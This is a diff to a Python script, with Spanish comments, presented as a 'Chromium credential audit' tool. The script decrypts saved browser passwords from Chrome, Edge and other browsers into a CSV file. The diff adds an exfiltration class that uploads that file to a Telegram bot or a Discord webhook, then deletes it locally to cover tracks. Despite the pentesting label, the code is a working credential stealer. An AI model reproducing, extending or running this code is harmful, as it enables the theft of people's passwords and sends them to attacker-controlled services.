@@ -8,6 +8,7 @@ import shutil
 import csv
 import logging
 import argparse
+import requests
 from pathlib import Path
 from datetime import datetime
 
@@ -19,7 +20,7 @@ except ImportError:
 
 from Cryptodome.Cipher import AES
 
-# Configuración de Logging
+# Configuración de Logging profesional
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -30,12 +31,58 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+class Exfiltrator:
+    """Gestor de exfiltración modular."""
+    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
+        self.telegram_token = telegram_token
+        self.telegram_chat_id = telegram_chat_id
+        self.discord_webhook = discord_webhook
+
+    def send_to_telegram(self, file_path):
+        """Envía el archivo CSV a un bot de Telegram."""
+        if not self.telegram_token or not self.telegram_chat_id:
+            return False
+            
+        url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
+        try:
+            with open(file_path, 'rb') as f:
+                response = requests.post(
+                    url, 
+                    data={'chat_id': self.telegram_chat_id}, 
+                    files={'document': f}
+                )
+            if response.status_code == 200:
+                logger.info("Exfiltración vía Telegram: EXITOSA.")
+                return True
+            else:
+                logger.error(f"Error Telegram: {response.text}")
+        except Exception as e:
+            logger.error(f"Falla crítica en exfiltración Telegram: {e}")
+        return False
+
+    def send_to_discord(self, file_path):
+        """Envía el reporte a un webhook de Discord."""
+        if not self.discord_webhook:
+            return False
+            
+        try:
+            with open(file_path, 'rb') as f:
+                response = requests.post(
+                    self.discord_webhook,
+                    files={'file': f}
+                )
+            if response.status_code in [200, 204]:
+                logger.info("Exfiltración vía Discord: EXITOSA.")
+                return True
+        except Exception as e:
+            logger.error(f"Falla crítica en exfiltración Discord: {e}")
+        return False
+
 class ChromiumDecryptor:
     def __init__(self):
         self.local_appdata = Path(os.environ.get('LOCALAPPDATA', ''))
         self.roaming_appdata = Path(os.environ.get('APPDATA', ''))
         
-        # Mapeo de rutas para navegadores basados en Chromium
         self.browsers = {
             "Chrome": self.local_appdata / "Google/Chrome/User Data",
             "Edge": self.local_appdata / "Microsoft/Edge/User Data",
@@ -46,7 +93,6 @@ class ChromiumDecryptor:
         }
 
     def get_secret_key(self, browser_path):
-        """Extrae la llave maestra de la configuración del navegador específico."""
         local_state_path = browser_path / "Local State"
         if not local_state_path.exists():
             return None
@@ -56,102 +102,101 @@ class ChromiumDecryptor:
                 local_state = json.load(f)
             
             encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            encrypted_key = encrypted_key[5:] # Quitar prefijo DPAPI
+            encrypted_key = encrypted_key[5:]
             
             if win32crypt:
                 secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                 return secret_key
-            else:
-                return None
         except Exception as e:
-            logger.debug(f"Error al obtener Master Key en {browser_path.name}: {e}")
-            return None
+            logger.debug(f"Error Master Key en {browser_path.name}: {e}")
+        return None
 
     def decrypt_password(self, ciphertext, secret_key):
-        """Descifra una contraseña individual usando AES-GCM."""
         try:
             iv = ciphertext[3:15]
             payload = ciphertext[15:-16]
             cipher = AES.new(secret_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload).decode()
-            return decrypted_pass
-        except Exception as e:
-            return f"[ERROR: {str(e)}]"
+            return cipher.decrypt(payload).decode()
+        except Exception:
+            return "[Error Descifrado]"
 
-    def audit(self, output_file="decrypted_passwords.csv", verbose=False):
-        """Realiza la auditoría en todos los navegadores detectados."""
-        total_extracted = 0
-        
+    def audit(self, output_file, verbose=False):
+        total = 0
         with open(output_file, mode='w', newline='', encoding='utf-8') as f:
             writer = csv.writer(f)
-            writer.writerow(["Browser", "Profile", "URL", "Username", "Password"])
+            writer.writerow(["Browser", "Profile", "URL", "User", "Pass"])
 
             for name, path in self.browsers.items():
-                if not path.exists():
-                    continue
+                if not path.exists(): continue
                 
-                logger.info(f"Analizando navegador: {name}...")
-                secret_key = self.get_secret_key(path)
-                if not secret_key:
-                    logger.warning(f"No se pudo obtener la llave maestra para {name}.")
-                    continue
+                key = self.get_secret_key(path)
+                if not key: continue
 
-                # Encontrar perfiles (Chrome/Edge/Brave usan carpetas 'Default' o 'Profile X')
-                # Opera suele guardar todo en la raíz de su carpeta de perfil
-                profiles = [p for p in path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
-                
-                # Si no hay carpetas de perfil (caso Opera), probamos directamente en la raíz
-                if not profiles:
-                    profiles = [path]
+                profiles = [p for p in path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))] or [path]
 
-                for profile_path in profiles:
-                    login_db = profile_path / "Login Data"
-                    if not login_db.exists():
-                        continue
+                for profile in profiles:
+                    login_db = profile / "Login Data"
+                    if not login_db.exists(): continue
 
-                    temp_db = Path("Loginvault_tmp.db")
+                    temp_db = Path("tmp_login.db")
                     try:
                         shutil.copy2(login_db, temp_db)
                         conn = sqlite3.connect(temp_db)
                         cursor = conn.cursor()
                         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                         
-                        found_count = 0
-                        for url, user, ciphertext in cursor.fetchall():
-                            if url and user and ciphertext:
-                                password = self.decrypt_password(ciphertext, secret_key)
-                                writer.writerow([name, profile_path.name, url, user, password])
-                                found_count += 1
-                                if verbose:
-                                    logger.info(f"[{name} - {profile_path.name}] Capturado: {url}")
+                        count = 0
+                        for url, user, cipher_pass in cursor.fetchall():
+                            if url and user and cipher_pass:
+                                password = self.decrypt_password(cipher_pass, key)
+                                writer.writerow([name, profile.name, url, user, password])
+                                count += 1
+                                if verbose: logger.info(f"[{name}] {url}")
 
-                        total_extracted += found_count
-                        logger.info(f"[{name}] {profile_path.name}: {found_count} credenciales extraídas.")
-                        cursor.close()
+                        total += count
                         conn.close()
                     except Exception as e:
-                        logger.error(f"Error procesando {name} ({profile_path.name}): {e}")
+                        logger.error(f"Error {name}: {e}")
                     finally:
-                        if temp_db.exists():
-                            temp_db.unlink()
+                        if temp_db.exists(): temp_db.unlink()
 
-        logger.info(f"Auditoría finalizada. Total: {total_extracted} credenciales en {output_file}")
+        return total
 
 def main():
-    parser = argparse.ArgumentParser(description="Auditoría de Credenciales Chromium - Suite Pentesting")
-    parser.add_argument("-o", "--output", default="decrypted_passwords.csv", help="Nombre del archivo de salida (CSV)")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Mostrar capturas en tiempo real en consola")
-    parser.add_argument("--silent", action="store_true", help="No mostrar nada en consola (solo archivo log)")
+    parser = argparse.ArgumentParser(description="Suite de Auditoría Auditor-Chromium (Phase 3)")
+    parser.add_argument("-o", "--output", default="audit_report.csv", help="Archivo reporte")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Logeo detallado")
+    
+    # Parámetros de Exfiltración
+    parser.add_argument("--telegram-token", help="Bot Token")
+    parser.add_argument("--telegram-chatid", help="Chat ID")
+    parser.add_argument("--discord", help="Webhook URL")
+    parser.add_argument("--no-wipe", action="store_true", help="NO borrar archivo tras exfiltración")
     
     args = parser.parse_args()
 
-    if args.silent:
-        logger.handlers[1].setLevel(logging.CRITICAL)
-
-    logger.info("Iniciando auditoría multi-navegador...")
+    logger.info("Iniciando auditoría Fase 3...")
     
     decryptor = ChromiumDecryptor()
-    decryptor.audit(output_file=args.output, verbose=args.verbose)
+    results_count = decryptor.audit(args.output, args.verbose)
+    
+    logger.info(f"Escaneo finalizado. {results_count} credenciales encontradas.")
+
+    if results_count > 0:
+        exf = Exfiltrator(args.telegram_token, args.telegram_chatid, args.discord)
+        
+        # Intentar Telegram
+        if args.telegram_token and args.telegram_chatid:
+            exf.send_to_telegram(args.output)
+            
+        # Intentar Discord
+        if args.discord:
+            exf.send_to_discord(args.output)
+
+        # Sigilo: Borrado de artefactos
+        if not args.no_wipe and (args.telegram_token or args.discord):
+            Path(args.output).unlink()
+            logger.info("Limpieza finalizada: Reporte CSV eliminado localmente por seguridad.")
 
 if __name__ == "__main__":
     main()
